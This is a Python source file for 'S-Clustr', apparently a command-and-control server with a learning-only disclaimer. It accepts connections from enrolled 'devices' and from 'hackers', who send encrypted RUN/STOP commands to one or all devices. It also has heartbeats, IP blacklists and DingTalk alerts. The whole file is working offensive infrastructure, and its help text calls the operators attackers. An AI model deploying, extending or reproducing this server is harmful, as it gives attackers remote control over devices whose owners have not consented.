#!/usr/bin/python3
# @Мартин.
from cgitb import reset
from math import log
from loguru import logger
import time
import socket
import random
import string
import threading
import json
import sys
sys.path.append(".")
import re
import argparse
import textwrap
import hashlib
from pack.S_Clustr_AES import S_Clustr_AES_CBC
from pack.DingTalkPush import DingTalk

configs = json.load(open('./config/Version.conf'))[sys.argv[0].split('.')[0]]

title = f'''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is onl y for learning and experiment. Do not use it
for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************
{configs['describe']}
'''
logo = f'''
███████╗       ██████╗██╗     ██╗   ██╗███████╗████████╗██████╗
██╔════╝      ██╔════╝██║     ██║   ██║██╔════╝╚══██╔══╝██╔══██╗
███████╗█████╗██║     ██║     ██║   ██║███████╗   ██║   ██████╔╝
╚════██║╚════╝██║     ██║     ██║   ██║╚════██║   ██║   ██╔══██╗
███████║      ╚██████╗███████╗╚██████╔╝███████║   ██║   ██║  ██║
╚══════╝       ╚═════╝╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝
                Github==>https://github.com/MartinxMax
                @Мартин. S-Clustr(Shadow Cluster) Server {configs['version']}'''
def init_logger():
    logger.level(name="Hacker", no=38, color="<magenta>")
    logger.level(name="Device", no=39, color="<blue>")
    logger.level(name="System", no=40, color="<red>")
    logger.remove()
    logger.add(
        sink=sys.stdout,
        format="<green>[{time:HH:mm:ss}]</green> | <level>{level: <8}</level> | {message}",
        level="INFO",
        colorize=True,
        backtrace=False,
        diagnose=False
    )


def myip():
    return socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)[0][4][0]

def generate_random_key(length=12):
    all_chars = string.ascii_letters + string.digits + string.punctuation
    random_chars = random.choices(all_chars, k=length)
    return ''.join(random_chars)

class Main():

    def __init__(self,args):
        init_logger()
        if self.__check_parameters(args):
            self.__aes=S_Clustr_AES_CBC()
            self.__DEVICE_IDS = {}
            self.__DEVICE_STATE = {}
            self.__DEVICE_CONNECT_STATE = {}
            self.__DEVICE_TYPE = {}
            self.DEV_BLACKLIST = set(json.load(open('./config/blacklist.conf'))['DEVICE']['black-list'])
            self.HACK_BLACKLIST = set(json.load(open('./config/blacklist.conf'))['HACKER']['black-list'])
            for i in range(1, int(self._SER_CONFIG['MAX_DEV'])+1):
                self.__DEVICE_IDS[i] = None
                self.__DEVICE_TYPE[i] = None
                self.__DEVICE_STATE[i] = 0
                self.__DEVICE_CONNECT_STATE[i] = 0
                self.__BEHAVIORS = {1: 'RUN', 2: 'STOP', 3: 'Query State'}
            self.__run()



    def __run(self):
        device_thread = threading.Thread(target=self.__server_device)
        heartbeat_thread = threading.Thread(target=self.__send_heartbeat)
        hacker_thread = threading.Thread(target=self.__server_hacker)
        device_thread.start()
        logger.log("System", f" [INFO] Device access module loading completed --- Max_devices [{self._SER_CONFIG['MAX_DEV']}]...")
        hacker_thread.start()
        logger.log("System", " [INFO] Hacker control module loading completed...")
        heartbeat_thread.start()
        logger.log("System"," [INFO] Device detection module loading completed...")

    def __check_parameters(self,args):
        try:
            self._CLI_CONFIG=json.load(open('./config/Client.conf'))
            self._SER_CONFIG = json.load(open('./config/Server.conf'))
        except Exception as e:
            logger.log("System", " [ERROR] The file does not exist or the file content is not in JSON format!")
            return False
        else:
            if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', args.LHOST):
                logger.log("System"," [ERROR] Unreasonable host address!")
                return False
            if not self.__is_valid_port(args.LPORTV):
                logger.log("System"," [ERROR] Incorrect port!")
                return False
            if not self.__is_valid_port(args.LPORTH):
                logger.log("System"," [ERROR] Incorrect port!")
                return False
            if len(args.KEYH) < 6 or len(args.KEYV) < 6:
                logger.log("System",f" [ERROR] The key length must be greater than 6 !!!")
                return False
            self.__LHOST = args.LHOST
            self.__LPORTV = args.LPORTV
            self.__LPORTH = args.LPORTH
            self.__MAXDEV = int(self._SER_CONFIG['MAX_DEV'])
            self.__KEYH = args.KEYH
            self.__KEYV = args.KEYV
            if self._SER_CONFIG['DINGTALK']['TOKEN'] and self._SER_CONFIG['DINGTALK']['SECRET']:
                self.DINGTALK = DingTalk(False)
                self.DINGTALK.set_token(self._SER_CONFIG['DINGTALK']['TOKEN'])
                self.DINGTALK.set_secret(self._SER_CONFIG['DINGTALK']['SECRET'])
                logger.log("System",f" [INFO] DingTalk monitoring enabled")
                self.DINGTALK.send_text(logo)

            logger.log("System",f" [INFO] Hacker_Auth_KEY:{self.__KEYH}")
            logger.log("System",f" [INFO] Hacker_Auth_KEY:{hashlib.md5(self.__KEYH.encode('utf-8')).hexdigest()}")
            logger.log("System",f" [INFO] Device_Auth_KEY:{self.__KEYV}")
            logger.log("System",f" [INFO] Device_Auth_KEY:{hashlib.md5(self.__KEYV.encode('utf-8')).hexdigest()}")
            return True


    def __is_valid_port(self, port):
        try:
            port = int(port)
            if 0 < port < 65536:
                return True
            else:
                return False
        except ValueError:
            return False


    def __send_heartbeat(self):
        while True:
            for dev_id in range(1, int(self._SER_CONFIG['MAX_DEV'])+1):
                client_socket = self.__DEVICE_IDS[dev_id]
                if client_socket:
                    try:
                        data=self._SER_CONFIG['HEART']
                        if self._SER_CONFIG['DEV_ENCRYPTION_Server'][self.__DEVICE_TYPE[dev_id]]:
                            data = self.__aes.aes_cbc_encode(self.__KEYV,data)
                        client_socket.send(data.encode('utf-8'))
                    except Exception as e:
                        self.__device_disconnected(dev_id)
                        logger.log("System",f'[WARNIGN] Device ID {dev_id} dropped...')
                        if self._SER_CONFIG['DINGTALK']['TOKEN'] and self._SER_CONFIG['DINGTALK']['SECRET']:
                            self.DINGTALK.send_text(f"[WARNIGN] Device ID:[{dev_id}] dropped...")

            time.sleep(int(self._SER_CONFIG['HEART_TIMEOUT']))


    def __device_disconnected(self,device_id):
        self.__DEVICE_IDS[device_id] = None
        self.__DEVICE_CONNECT_STATE[device_id] = 0
        self.__DEVICE_STATE[device_id] = 0
        self.__DEVICE_TYPE[device_id] = None

    def __respon_code(self,code,content):
        return self.__aes.aes_cbc_encode(self.__KEYH,f"[{code}] {content}").encode('utf-8')

    def __send_device_info(self,device_id, client_socket):
        data = {
            'device_id': 'all' if device_id == 0 else device_id,
            'device_type':self.__DEVICE_TYPE if device_id == 0 else self.__DEVICE_TYPE[device_id],
            'device_state': self.__DEVICE_STATE if device_id == 0 else self.__DEVICE_STATE[device_id],
            'device_connect_state': self.__DEVICE_CONNECT_STATE if device_id == 0 else self.__DEVICE_CONNECT_STATE[device_id]
        }
        try:
            client_socket.send(self.__aes.aes_cbc_encode(self.__KEYH,json.dumps(data)).encode('utf-8'))
        except Exception as e:
            client_socket.send(self.__respon_code("404","Unable to obtain device configuration"))

    def __control_device(self,device_id, client_socket, command):
        try:
                device_socket = self.__DEVICE_IDS[device_id]
                if device_socket:
                    if self._SER_CONFIG['DEV_ENCRYPTION_Server'][self.__DEVICE_TYPE[device_id]] :
                            command = self.__aes.aes_cbc_encode(self.__KEYV,command)
                    device_socket.send(command.encode('utf-8'))
                    try:
                        respon = device_socket.recv(1024).decode('utf-8').strip()
                        if self._SER_CONFIG['DEV_ENCRYPTION_Server'][self.__DEVICE_TYPE[device_id]] :
                                respon = self.__aes.aes_cbc_decode(self.__KEYV,respon)
                    except Exception as e:
                        client_socket.send(self.__respon_code("404",f"Device {device_id} not respondin"))
                    else:
                        if respon:
                            if self._CLI_CONFIG[self.__DEVICE_TYPE[device_id]]['DEV_RUN_RECV'] == str(respon):
                                self.__DEVICE_STATE[device_id] = 1
                                logger.log("Device",f" [SUCCESS] Device:{str(device_id)} State:Runing...")
                                if self._SER_CONFIG['DINGTALK']['TOKEN'] and self._SER_CONFIG['DINGTALK']['SECRET']:
                                    self.DINGTALK.send_text(f" [SUCCESS] Device:{str(device_id)} State:Runing...")
                                client_socket.send(self.__respon_code("200",f"id:{str(device_id)}<{self.__DEVICE_TYPE[device_id]}> status: RUN"))
                            elif  self._CLI_CONFIG[self.__DEVICE_TYPE[device_id]]['DEV_STOP_RECV'] == respon:
                                self.__DEVICE_STATE[device_id] = 0
                                logger.log("Device",f" [SUCCESS] Device:{str(device_id)} State:Stoped...")
                                if self._SER_CONFIG['DINGTALK']['TOKEN'] and self._SER_CONFIG['DINGTALK']['SECRET']:
                                    self.DINGTALK.send_text(f" [SUCCESS] Device:{str(device_id)} State:Stoped...")
                                client_socket.send(self.__respon_code("200",f"id:{str(device_id)}<{self.__DEVICE_TYPE[device_id]}> status: STOP"))
                            else:
                                logger.log("Device",f" [Fail] Can't control Device:{str(device_id)}")
                                client_socket.send(self.__respon_code("404",f"Control Device id:{str(device_id)}<{self.__DEVICE_TYPE[device_id]}> Fail!!!"))
                        else:
                            client_socket.send(self.__respon_code("404","Device not responding"))
                else:
                    client_socket.send(self.__respon_code("404",f"Device [{device_id}] not online"))
        except Exception as e:
            print(e)
            client_socket.send(self.__respon_code("404",f"all Device not online"))

    def __server_hacker(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(('', self.__LPORTH))
        server_socket.listen(1)
        logger.log("System",f" [INFO] Hacker Service [{self.__LHOST}:{self.__LPORTH}]")
        def handle_client(client_socket, client_address):
            if client_address[0] in self.HACK_BLACKLIST:
                logger.log("Hacker", f" [INFO] {client_address[0]} is blacklisted")
                client_socket.close()
                return
            logger.log("Hacker",f" [INFO] {client_address[0]} Connected")
            client_socket.settimeout(int(self._SER_CONFIG['HACK_AUTH_TIMEOUT']))
            try:
                while True:
                    data = client_socket.recv(1024)
                    if not data:
                        break
                    try:
                        received_string = data.decode('utf-8').strip()
                        current_time = int(time.time())
                        htimestamp = int(received_string[:8], 16)
                        device_id = int(received_string[8:13], 16)
                        state = int(received_string[13:16], 16)
                        sig = received_string[17:]
                        result = int(self.__aes.aes_cbc_decode(key=self.__KEYH,data=sig))
                    except Exception as e:
                        logger.log("Hacker",f" [ERROR] IP:{client_address[0]} Identity authentication failed!")
                    else:
                        if result and htimestamp == result and current_time - htimestamp <= int(self._SER_CONFIG['HACK_PACK_TIMEOUT']):
                            logger.log("Hacker", f" [INFO] Access Device ID [{device_id if device_id != 0 else '1-10'}] Request Control Behavior [{self.__BEHAVIORS[state]}]")
                            if state == 1 or state == 2:
                                if device_id == 0:
                                    device_ids_true_id = [key for key, value in self.__DEVICE_CONNECT_STATE.items() if value == 1]
                                    if len(device_ids_true_id) > 0:
                                        for id in device_ids_true_id:
                                            try:
                                                self.__control_device(id, client_socket,self._CLI_CONFIG[self.__DEVICE_TYPE[id]][ 'RUN' if state == 1 else 'STOP'])
                                            except Exception as e:
                                                logger.log("Hacker", f" [ERROR] Sending command {self.__BEHAVIORS[state]} to device ID {id} failed!")
                                    else:
                                        logger.log("Hacker", " [ERROR] No devices are online!")
                                else:
                                    self.__control_device(device_id, client_socket, self._CLI_CONFIG[self.__DEVICE_TYPE[device_id]][ 'RUN' if state == 1 else 'STOP'])

                            elif state == 3:
                                self.__send_device_info(device_id, client_socket)

                        else:
                            logger.log("Hacker", f" [ERROR] IP:{client_address[0]} Identity authentication failed!")
            except Exception as e:
                logger.log("Hacker",f" [ERROR] IP:{client_address[0]} There is an error: {str(e)}")
            finally:
                client_socket.close()
                logger.log("Hacker",f" [INFO] IP:{client_address[0]} disconnected...")

        while True:
            client_socket, client_address = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.start()


    def __server_device(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(('', self.__LPORTV))
        server_socket.listen(1)
        logger.log("System",f" [INFO] Device Service [{self.__LHOST}:{self.__LPORTV}]")
        def assign_id(client_socket):
            for dev_id in range(1, self.__MAXDEV+1):
                if not self.__DEVICE_IDS[dev_id]:
                    self.__DEVICE_IDS[dev_id] = client_socket
                    self.__DEVICE_CONNECT_STATE[dev_id] = 1
                    return dev_id
            return None


        def __is_json(str):
            try:
                json.loads(str)
                return True
            except ValueError:
                return False

        def handle_client(client_socket, client_address):
            if client_address[0] in self.DEV_BLACKLIST:
                logger.log("Device", f" [INFO] {client_address[0]} is blacklisted")
                client_socket.close()
                return
            logger.log("Device", f" [INFO] {client_address[0]} connected")
            client_socket.settimeout(int(self._SER_CONFIG['DEV_AUTH_TIMEOUT']))
            try:
                data = client_socket.recv(1024).decode('utf-8')

                if not __is_json(data):
                    data = self.__aes.aes_cbc_decode(self.__KEYV, data)
                data = json.loads(data)

                if data['TYPE'] not in self._SER_CONFIG['DEV_TYPE']:
                    raise ValueError(f"Invalid device type: {data['TYPE']}")
                device_id = assign_id(client_socket)
                if not device_id:
                    raise ValueError("Unable to assign ID to device")

                self.__DEVICE_TYPE[device_id] = data['TYPE']
                logger.log("Device", f" [INFO] Assigned ID[{str(device_id)}] to {client_address[0]} [Type:{self.__DEVICE_TYPE[device_id]}]")
                client_socket.settimeout(None)

                if self._SER_CONFIG['DINGTALK']['TOKEN'] and self._SER_CONFIG['DINGTALK']['SECRET']:
                    self.DINGTALK.send_text(f" [INFO] Device Assigned ID[{str(device_id)}] to {client_address[0]} [Type:{self.__DEVICE_TYPE[device_id]}]")

            except ValueError as e:
                logger.log("Device", f" [ERROR] {client_address[0]} failed validation: {str(e)}")
                client_socket.close()

            except Exception as e:
                logger.log("Device", f" [ERROR] {client_address[0]} failed validation: {str(e)}")
                client_socket.close()

        while True:
            client_socket, client_address = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.start()


if __name__ == '__main__':
    print(logo)
    print(title)
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
            Example:
                author-Github==>https://github.com/MartinxMax
            Basic usage:
                python3 {S_Clustr} -lh {ip} -lpv 10000 -lph 9999 # Attackers connect to port 9999, devices connect to server port 10000
                python3 {S_Clustr} -keyh Maptnh # Custom string as key for AES encryption for Hacker
                python3 {S_Clustr} -keyv Maptnh # Custom string as key for AES encryption for Device
                '''.format(S_Clustr=sys.argv[0],ip=myip())))
    parser.add_argument('-lh', '--LHOST',default=myip(), help='Listen_IP')
    parser.add_argument('-lpv', '--LPORTV',type=int,default='10000', help='Device_Port')
    parser.add_argument('-lph', '--LPORTH',type=int,default='9999', help='Hacker_Port')
    parser.add_argument('-keyh', '--KEYH',default=generate_random_key(), help='AES_CBC_Key_Hacker')
    parser.add_argument('-keyv', '--KEYV',default=generate_random_key(), help='AES_CBC_Key_Device')
    args = parser.parse_args()
    Main(args)
